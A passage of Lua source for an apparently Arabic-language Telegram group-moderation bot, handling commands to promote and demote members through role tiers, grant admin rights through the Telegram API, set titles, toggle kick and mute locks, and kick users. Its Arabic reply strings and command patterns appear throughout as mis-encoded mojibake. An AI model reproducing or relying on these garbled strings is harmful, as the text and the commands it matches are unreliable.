Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธ*ุงููุนุฑู ุบูุฑ ุตุญูุญ*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^ุชูุฒูู ููุดุฆ ุงุณุงุณู (%d+)') and ChCheck(msg) then
local user = text:match('ุชูุฒูู ููุดุฆ ุงุณุงุณู (%d+)')
Devmfm:srem(mustafa..'mfm:BasicConstructor:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","โ๏ธุชู ุชูุฒููู ููุดุฆ ุงุณุงุณู")  
end end
if text ==('ุฑูุน ููุดุฆ ุงุณุงุณู') and not mfmConstructor(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธูุฐุง ุงูุงูุฑ ูููุดุฆ ุงููุฌููุนู ูุงููุทูุฑูู ููุท', 1, 'md')
end
--    Set  Constructor    --
if BasicConstructor(msg) then
if text ==('ุฑูุน ููุดุฆ') and ChCheck(msg) then
function raf_reply(extra, result, success)
Devmfm:sadd(mustafa..'mfm:Constructor:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธุชู ุฑูุนู ูู ูุงุฆูุฉ ุงูููุดุฆูู")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^ุฑูุน ููุดุฆ @(.*)') and ChCheck(msg) then
local username = text:match('^ุฑูุน ููุดุฆ @(.*)')
function promreply(extra,result,success)
if result.id_ then
Devmfm:sadd(mustafa..'mfm:Constructor:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","โ๏ธุชู ุฑูุนู ูู ูุงุฆูุฉ ุงูููุดุฆูู")  
else 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธ*ุงููุนุฑู ุบูุฑ ุตุญูุญ*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^ุฑูุน ููุดุฆ (%d+)') and ChCheck(msg) then
local user = text:match('ุฑูุน ููุดุฆ (%d+)')
Devmfm:sadd(mustafa..'mfm:Constructor:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","โ๏ธุชู ุฑูุนู ูู ูุงุฆูุฉ ุงูููุดุฆูู")  
end
--    Rem  Constructor    --
if text ==('ุชูุฒูู ููุดุฆ') and ChCheck(msg) then
function prom_reply(extra, result, success)
Devmfm:srem(mustafa..'mfm:Constructor:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธุชู ุชูุฒููู ูู ูุงุฆูุฉ ุงูููุดุฆูู")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^ุชูุฒูู ููุดุฆ @(.*)') and ChCheck(msg) then
local username = text:match('^ุชูุฒูู ููุดุฆ @(.*)')
function promreply(extra,result,success)
if result.id_ then
Devmfm:srem(mustafa..'mfm:Constructor:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","โ๏ธุชู ุชูุฒููู ูู ูุงุฆูุฉ ุงูููุดุฆูู")  
else 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธ*ุงููุนุฑู ุบูุฑ ุตุญูุญ*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^ุชูุฒูู ููุดุฆ (%d+)') and ChCheck(msg) then
local user = text:match('ุชูุฒูู ููุดุฆ (%d+)')
Devmfm:srem(mustafa..'mfm:Constructor:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","โ๏ธุชู ุชูุฒููู ูู ูุงุฆูุฉ ุงูููุดุฆูู")  
end 
end
--      Set Manager       --
if Constructor(msg) then
if text ==('ุฑูุน ูุฏูุฑ') and ChCheck(msg) then
function prom_reply(extra, result, success)
Devmfm:sadd(mustafa..'mfm:Managers:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธุชู ุฑูุนู ูู ูุงุฆูุฉ ุงููุฏุฑุงุก")  
end  
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^ุฑูุน ูุฏูุฑ @(.*)') and ChCheck(msg) then
local username = text:match('^ุฑูุน ูุฏูุฑ @(.*)')
function promreply(extra,result,success)
if result.id_ then
Devmfm:sadd(mustafa..'mfm:Managers:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","โ๏ธุชู ุฑูุนู ูู ูุงุฆูุฉ ุงููุฏุฑุงุก")  
else 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธ*ุงููุนุฑู ุบูุฑ ุตุญูุญ*', 1, 'md')
end end 
resolve_username(username,promreply)
end 
if text and text:match('^ุฑูุน ูุฏูุฑ (%d+)') and ChCheck(msg) then
local user = text:match('ุฑูุน ูุฏูุฑ (%d+)')
Devmfm:sadd(mustafa..'mfm:Managers:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","โ๏ธุชู ุฑูุนู ูู ูุงุฆูุฉ ุงููุฏุฑุงุก")  
end
--       Rem Manager      --
if text ==('ุชูุฒูู ูุฏูุฑ') and ChCheck(msg) then
function prom_reply(extra, result, success)
Devmfm:srem(mustafa..'mfm:Managers:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธุชู ุชูุฒููู ูู ูุงุฆูุฉ ุงููุฏุฑุงุก")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^ุชูุฒูู ูุฏูุฑ @(.*)') and ChCheck(msg) then
local username = text:match('^ุชูุฒูู ูุฏูุฑ @(.*)')
function promreply(extra,result,success)
if result.id_ then
Devmfm:srem(mustafa..'mfm:Managers:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","โ๏ธุชู ุชูุฒููู ูู ูุงุฆูุฉ ุงููุฏุฑุงุก")  
else 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธ*ุงููุนุฑู ุบูุฑ ุตุญูุญ*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^ุชูุฒูู ูุฏูุฑ (%d+)') and ChCheck(msg) then
local user = text:match('ุชูุฒูู ูุฏูุฑ (%d+)')
Devmfm:srem(mustafa..'mfm:Managers:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","โ๏ธุชู ุชูุฒููู ูู ูุงุฆูุฉ ุงููุฏุฑุงุก")  
end 
--       Set Cleaner      --
if text ==('ุฑูุน ููุธู') and ChCheck(msg) then
function prom_reply(extra, result, success)
Devmfm:sadd(mustafa..'mfm:Cleaner:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธุชู ุฑูุนู ูู ูุงุฆูุฉ ุงูููุธููู")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^ุฑูุน ููุธู @(.*)') and ChCheck(msg) then
local username = text:match('^ุฑูุน ููุธู @(.*)')
function promreply(extra,result,success)
if result.id_ then
Devmfm:sadd(mustafa..'mfm:Cleaner:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","โ๏ธุชู ุฑูุนู ูู ูุงุฆูุฉ ุงูููุธููู")  
else 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธ*ุงููุนุฑู ุบูุฑ ุตุญูุญ*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^ุฑูุน ููุธู (%d+)') and ChCheck(msg) then
local user = text:match('ุฑูุน ููุธู (%d+)')
Devmfm:sadd(mustafa..'mfm:Cleaner:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","โ๏ธุชู ุฑูุนู ูู ูุงุฆูุฉ ุงูููุธููู")  
end
--       Rem Cleaner      --
if text ==('ุชูุฒูู ููุธู') and ChCheck(msg) then
function prom_reply(extra, result, success)
Devmfm:srem(mustafa..'mfm:Cleaner:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธุชู ุชูุฒููู ูู ูุงุฆูุฉ ุงูููุธููู")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^ุชูุฒูู ููุธู @(.*)') and ChCheck(msg) then
local username = text:match('^ุชูุฒูู ููุธู @(.*)')
function promreply(extra,result,success)
if result.id_ then
Devmfm:srem(mustafa..'mfm:Cleaner:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","โ๏ธุชู ุชูุฒููู ูู ูุงุฆูุฉ ุงูููุธููู")  
else 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธ*ุงููุนุฑู ุบูุฑ ุตุญูุญ*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^ุชูุฒูู ููุธู (%d+)') and ChCheck(msg) then
local user = text:match('ุชูุฒูู ููุธู (%d+)')
Devmfm:srem(mustafa..'mfm:Cleaner:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","โ๏ธุชู ุชูุฒููู ูู ูุงุฆูุฉ ุงูููุธููู")  
end end
--       Set admin        --
if Manager(msg) then
if text ==('ุฑูุน ุงุฏูู') and ChCheck(msg) then
function prom_reply(extra, result, success)
if not BasicConstructor(msg) and Devmfm:get(mustafa.."mfm:Lock:ProSet"..msg.chat_id_) then 
Dev_mfm(msg.chat_id_, msg.id_, 1,'โ๏ธูุงุชุณุชุทูุน ุฑูุน ุงุญุฏ ูุฐุงูู ุจุณุจุจ ุชุนุทูู ุงูุฑูุน ูู ูุจู ุงูููุดุฆููู', 1, 'md')
return false
end
Devmfm:sadd(mustafa..'mfm:Admins:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธุชู ุฑูุนู ูู ูุงุฆูุฉ ุงูุงุฏูููู")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^ุฑูุน ุงุฏูู @(.*)') and ChCheck(msg) then
local username = text:match('^ุฑูุน ุงุฏูู @(.*)')
function promreply(extra,result,success)
if not BasicConstructor(msg) and Devmfm:get(mustafa.."mfm:Lock:ProSet"..msg.chat_id_) then 
Dev_mfm(msg.chat_id_, msg.id_, 1,'โ๏ธูุงุชุณุชุทูุน ุฑูุน ุงุญุฏ ูุฐุงูู ุจุณุจุจ ุชุนุทูู ุงูุฑูุน ูู ูุจู ุงูููุดุฆููู', 1, 'md')
return false
end
if result.id_ then
Devmfm:sadd(mustafa..'mfm:Admins:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","โ๏ธุชู ุฑูุนู ูู ูุงุฆูุฉ ุงูุงุฏูููู")  
else 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธ*ุงููุนุฑู ุบูุฑ ุตุญูุญ*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^ุฑูุน ุงุฏูู (%d+)') and ChCheck(msg) then
local user = text:match('ุฑูุน ุงุฏูู (%d+)')
if not BasicConstructor(msg) and Devmfm:get(mustafa.."mfm:Lock:ProSet"..msg.chat_id_) then 
Dev_mfm(msg.chat_id_, msg.id_, 1,'โ๏ธูุงุชุณุชุทูุน ุฑูุน ุงุญุฏ ูุฐุงูู ุจุณุจุจ ุชุนุทูู ุงูุฑูุน ูู ูุจู ุงูููุดุฆููู', 1, 'md')
return false
end
Devmfm:sadd(mustafa..'mfm:Admins:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","โ๏ธุชู ุฑูุนู ูู ูุงุฆูุฉ ุงูุงุฏูููู")  
end
--        Rem admin       --
if text ==('ุชูุฒูู ุงุฏูู') and ChCheck(msg) then
function prom_reply(extra, result, success)
Devmfm:srem(mustafa..'mfm:Admins:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธุชู ุชูุฒููู ูู ูุงุฆูุฉ ุงูุงุฏูููู")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^ุชูุฒูู ุงุฏูู @(.*)') and ChCheck(msg) then
local username = text:match('^ุชูุฒูู ุงุฏูู @(.*)')
function promreply(extra,result,success)
if result.id_ then
Devmfm:srem(mustafa..'mfm:Admins:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","โ๏ธุชู ุชูุฒููู ูู ูุงุฆูุฉ ุงูุงุฏูููู")  
else 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธ*ุงููุนุฑู ุบูุฑ ุตุญูุญ*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^ุชูุฒูู ุงุฏูู (%d+)') and ChCheck(msg) then
local user = text:match('ุชูุฒูู ุงุฏูู (%d+)')
Devmfm:srem(mustafa..'mfm:Admins:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","โ๏ธุชู ุชูุฒููู ูู ูุงุฆูุฉ ุงูุงุฏูููู")  
end end
--       Set Vipmem       --
if Admin(msg) then
if text ==('ุฑูุน ูููุฒ') and ChCheck(msg) then
function prom_reply(extra, result, success)
if not BasicConstructor(msg) and Devmfm:get(mustafa.."mfm:Lock:ProSet"..msg.chat_id_) then 
Dev_mfm(msg.chat_id_, msg.id_, 1,'โ๏ธูุงุชุณุชุทูุน ุฑูุน ุงุญุฏ ูุฐุงูู ุจุณุจุจ ุชุนุทูู ุงูุฑูุน ูู ูุจู ุงูููุดุฆููู', 1, 'md')
return false
end
Devmfm:sadd(mustafa..'mfm:VipMem:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธุชู ุฑูุนู ูู ูุงุฆูุฉ ุงููููุฒูู")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^ุฑูุน ูููุฒ @(.*)') and ChCheck(msg) then
local username = text:match('^ุฑูุน ูููุฒ @(.*)')
function promreply(extra,result,success)
if not BasicConstructor(msg) and Devmfm:get(mustafa.."mfm:Lock:ProSet"..msg.chat_id_) then 
Dev_mfm(msg.chat_id_, msg.id_, 1,'โ๏ธูุงุชุณุชุทูุน ุฑูุน ุงุญุฏ ูุฐุงูู ุจุณุจุจ ุชุนุทูู ุงูุฑูุน ูู ูุจู ุงูููุดุฆููู', 1, 'md')
return false
end
if result.id_ then
Devmfm:sadd(mustafa..'mfm:VipMem:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","โ๏ธุชู ุฑูุนู ูู ูุงุฆูุฉ ุงููููุฒูู")  
else 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธ*ุงููุนุฑู ุบูุฑ ุตุญูุญ*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^ุฑูุน ูููุฒ (%d+)') and ChCheck(msg) then
local user = text:match('ุฑูุน ูููุฒ (%d+)')
if not BasicConstructor(msg) and Devmfm:get(mustafa.."mfm:Lock:ProSet"..msg.chat_id_) then 
Dev_mfm(msg.chat_id_, msg.id_, 1,'โ๏ธูุงุชุณุชุทูุน ุฑูุน ุงุญุฏ ูุฐุงูู ุจุณุจุจ ุชุนุทูู ุงูุฑูุน ูู ูุจู ุงูููุดุฆููู', 1, 'md')
return false
end
Devmfm:sadd(mustafa..'mfm:VipMem:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","โ๏ธุชู ุฑูุนู ูู ูุงุฆูุฉ ุงููููุฒูู")  
end
--       Rem Vipmem       --
if text ==('ุชูุฒูู ูููุฒ') and ChCheck(msg) then
function prom_reply(extra, result, success)
Devmfm:srem(mustafa..'mfm:VipMem:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธุชู ุชูุฒููู ูู ูุงุฆูุฉ ุงููููุฒูู")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^ุชูุฒูู ูููุฒ @(.*)') and ChCheck(msg) then
local username = text:match('^ุชูุฒูู ูููุฒ @(.*)')
function promreply(extra,result,success)
if result.id_ then
Devmfm:srem(mustafa..'mfm:VipMem:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","โ๏ธุชู ุชูุฒููู ูู ูุงุฆูุฉ ุงููููุฒูู")  
else 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธ*ุงููุนุฑู ุบูุฑ ุตุญูุญ*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^ุชูุฒูู ูููุฒ (%d+)') and ChCheck(msg) then
local user = text:match('ุชูุฒูู ูููุฒ (%d+)')
Devmfm:srem(mustafa..'mfm:VipMem:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","โ๏ธุชู ุชูุฒููู ูู ูุงุฆูุฉ ุงููููุฒูู")  
end end 
if BasicConstructor(msg) then
if text and text:match("^ุฑูุน ูุดุฑู$") and msg.reply_to_message_id_ then
function promote_by_reply(extra, result, success)
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..mustafa)
local GetInfo = JSON.decode(Check)
if GetInfo.result.can_promote_members == true then 
HTTPS.request("https://api.telegram.org/bot" .. TokenBot .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=false")
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธุชู ุฑูุนู ูุดุฑู ูู ุงููุฌููุนู")  
else
Dev_mfm(msg.chat_id_, msg.id_, 1,'โ๏ธููุณุช ูุฏู ุตูุงุญูุฉ ุงุถุงูุฉ ูุดุฑููู ุฌุฏุฏ ูุฑุฌู ุงูุชุญูู ูู ุงูุตูุงุญูุงุช', 1, 'md')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
if text and text:match("^ุชูุฒูู ูุดุฑู$") and msg.reply_to_message_id_ then
function promote_by_reply(extra, result, success)
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..mustafa)
local GetInfo = JSON.decode(Check)
if GetInfo.result.can_promote_members == true then 
HTTPS.request("https://api.telegram.org/bot" .. TokenBot .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธุชู ุชูุฒููู ูู ูุดุฑููู ุงููุฌููุนู")  
else
Dev_mfm(msg.chat_id_, msg.id_, 1,'โ๏ธููุณุช ูุฏู ุตูุงุญูุฉ ุงุถุงูุฉ ูุดุฑููู ุฌุฏุฏ ูุฑุฌู ุงูุชุญูู ูู ุงูุตูุงุญูุงุช', 1, 'md')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end 
if text and (text:match("^ุฑูุน ุจูู ุงูุตูุงุญูุงุช$") or text:match("^ุฑูุน ุจูู ุตูุงุญูุงุช$")) and msg.reply_to_message_id_ then
function promote_by_reply(extra, result, success)
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..mustafa)
local GetInfo = JSON.decode(Check)
if GetInfo.result.can_promote_members == true then 
HTTPS.request("https://api.telegram.org/bot" .. TokenBot .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=True")
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธุชู ุฑูุนู ูุดุฑู ูู ุฌููุน ุงูุตูุงุญูุงุช")  
else
Dev_mfm(msg.chat_id_, msg.id_, 1,'โ๏ธููุณุช ูุฏู ุตูุงุญูุฉ ุงุถุงูุฉ ูุดุฑููู ุฌุฏุฏ ูุฑุฌู ุงูุชุญูู ูู ุงูุตูุงุญูุงุช', 1, 'md')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
if text and (text:match("^ูุถุน ููุจ (.*)$") or text:match("^ุฑูุน ูุดุฑู (.*)$") or text:match("^ุถุน ููุจ (.*)$")) and ChCheck(msg) then
local mfm = text:match("^ูุถุน ููุจ (.*)$") or text:match("^ุฑูุน ูุดุฑู (.*)$") or text:match("^ุถุน ููุจ (.*)$")
function ReplySet(extra, result, success)
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..mustafa)
local GetInfo = JSON.decode(Check)
if GetInfo.result.can_promote_members == true then 
https.request("https://api.telegram.org/bot"..TokenBot.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=True&can_restrict_members=false&can_pin_messages=True&can_promote_members=false")
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธุชู ุงุถุงูุฉ โซ "..mfm.." ูููุจ ูู")  
https.request("https://api.telegram.org/bot"..TokenBot.."/setChatAdministratorCustomTitle?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&custom_title="..mfm)
else
Dev_mfm(msg.chat_id_, msg.id_, 1,'โ๏ธููุณุช ูุฏู ุตูุงุญูุฉ ุงุถุงูุฉ ูุดุฑููู ุฌุฏุฏ ูุฑุฌู ุงูุชุญูู ูู ุงูุตูุงุญูุงุช', 1, 'md')
end
end
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),ReplySet)
end
end
end
if text == "ุตูุงุญูุชู" or text == "ุตูุงุญูุงุชู" and ChCheck(msg) then 
if tonumber(msg.reply_to_message_id_) == 0 then 
Validity(msg,msg.sender_user_id_)
end end
if text ==('ุตูุงุญูุชู') or text ==('ุตูุงุญูุงุชู') and ChCheck(msg) then
function ValidityReply(extra, result, success)
Validity(msg,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),ValidityReply)
end end
if text and (text:match('^ุตูุงุญูุชู @(.*)') or text:match('^ุตูุงุญูุงุชู @(.*)')) and ChCheck(msg) then
local username = text:match('^ุตูุงุญูุชู @(.*)') or text:match('^ุตูุงุญูุงุชู @(.*)')
function ValidityUser(extra,result,success)
if result.id_ then
Validity(msg,result.id_) 
else 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธ*ุงููุนุฑู ุบูุฑ ุตุญูุญ*', 1, 'md')
end end 
resolve_username(username,ValidityUser)
end
if text and (text:match('^ุตูุงุญูุชู (%d+)') or text:match('^ุตูุงุญูุงุชู (%d+)')) and ChCheck(msg) then
local ValidityId = text:match('ุตูุงุญูุชู (%d+)') or text:match('ุตูุงุญูุงุชู (%d+)')
Validity(msg,ValidityId)  
end
if Admin(msg) then
if msg.reply_to_message_id_ ~= 0 then
if text and (text:match("^ูุณุญ$") or text:match("^ุญุฐู$")) and ChCheck(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.reply_to_message_id_})
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุชู ุญุฐู ุงูุฑุณุงูู ูุน ุฑุณุงูุฉ ุงูุงูุฑ', 1, 'md')
end end end
if Constructor(msg) then
if text == "ุชูุนูู ุงูุญุธุฑ" and ChCheck(msg) or text == "ุชูุนูู ุงูุทุฑุฏ" and ChCheck(msg) then
Devmfm:del(mustafa.."mfm:Lock:KickBan"..msg.chat_id_)
local mustafaTEAM = 'โ๏ธุงููุง ุนุฒูุฒู โซ '..mfmRank(msg)..' \nโ๏ธุชู ุชูุนูู ุงูุทุฑุฏ ูุงูุญุธุฑ'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
end
if text == "ุชุนุทูู ุงูุญุธุฑ" and ChCheck(msg) or text == "ุชุนุทูู ุงูุทุฑุฏ" and ChCheck(msg) then
Devmfm:set(mustafa.."mfm:Lock:KickBan"..msg.chat_id_,"true")
local mustafaTEAM = 'โ๏ธุงููุง ุนุฒูุฒู โซ '..mfmRank(msg)..' \nโ๏ธุชู ุชุนุทูู ุงูุทุฑุฏ ูุงูุญุธุฑ'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
end
if text == "ุชูุนูู ุงููุชู" and ChCheck(msg) or text == "ุชูุนูู ุงูุชูููุฏ" and ChCheck(msg) then
Devmfm:del(mustafa.."mfm:Lock:MuteTked"..msg.chat_id_)
local mustafaTEAM = 'โ๏ธุงููุง ุนุฒูุฒู โซ '..mfmRank(msg)..' \nโ๏ธุชู ุชูุนูู ุงููุชู ูุงูุชููุฏ'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
end
if text == "ุชุนุทูู ุงููุชู" and ChCheck(msg) or text == "ุชุนุทูู ุงูุชูููุฏ" and ChCheck(msg) then
Devmfm:set(mustafa.."mfm:Lock:MuteTked"..msg.chat_id_,"true")
local mustafaTEAM = 'โ๏ธุงููุง ุนุฒูุฒู โซ '..mfmRank(msg)..' \nโ๏ธุชู ุชุนุทูู ุงููุชู ูุงูุชููุฏ'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
end
end
if BasicConstructor(msg) then
if text == "ุชูุนูู ุงูุฑูุน" and ChCheck(msg) or text == "ุชูุนูู ุงูุชุฑููู" and ChCheck(msg) then
Devmfm:del(mustafa.."mfm:Lock:ProSet"..msg.chat_id_)
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุชู ุชูุนูู ุฑูุน โซ ุงูุงุฏูู โข ุงููููุฒ', 1, 'md')
end
if text == "ุชุนุทูู ุงูุฑูุน" and ChCheck(msg) or text == "ุชุนุทูู ุงูุชุฑููู" and ChCheck(msg) then
Devmfm:set(mustafa.."mfm:Lock:ProSet"..msg.chat_id_,"true")
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุชู ุชุนุทูู ุฑูุน โซ ุงูุงุฏูู โข ุงููููุฒ', 1, 'md')
end
end
--          Kick          --
if Admin(msg) then
if text ==('ุทุฑุฏ') and ChCheck(msg) then
function KickReply(extra, result, success)
if not Constructor(msg) and Devmfm:get(mustafa.."mfm:Lock:KickBan"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'โ๏ธููุฏ ุชู ุชุนุทูู ุงูุทุฑุฏ ูุงูุญุธุฑ ูู ูุจู ุงูููุดุฆูู')
return false
end
if RankChecking(result.sender_user_id_, result.chat_id_) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธูุง ุชุณุชุทูุน ุทุฑุฏ โซ '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md')
else
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=result.sender_user_id_,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_,msg.id_,"โ๏ธููุณ ูุฏู ุตูุงุญูุฉ ุญุธุฑ ุงููุณุชุฎุฏููู ูุฑุฌู ุชูุนูููุง !") 
return false  
end
if dp and dp.code_ and dp.code_ == 400 and dp.message_ == "USER_ADMIN_INVALID" then 
send(msg.chat_id_,msg.id_,"โ๏ธูุง ุงุณุชุทูุน ุทุฑุฏ ูุดุฑููู ุงููุฌููุนู") 
return false  
end
ChatKick(result.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธุชู ุทุฑุฏู ูู ุงููุฌููุนู")  
end,nil)
end
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),KickReply)
end end
if text and text:match('^ุทุฑุฏ @(.*)') and ChCheck(msg) then
local username = text:match('^ุทุฑุฏ @(.*)')
function KickUser(extra,result,success)
if not Constructor(msg) and Devmfm:get(mustafa.."mfm:Lock:KickBan"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'โ๏ธููุฏ ุชู ุชุนุทูู ุงูุทุฑุฏ ูุงูุญุธุฑ ูู ูุจู ุงูููุดุฆูู')
return false
end
if result.id_ then
if RankChecking(result.id_, msg.chat_id_) then
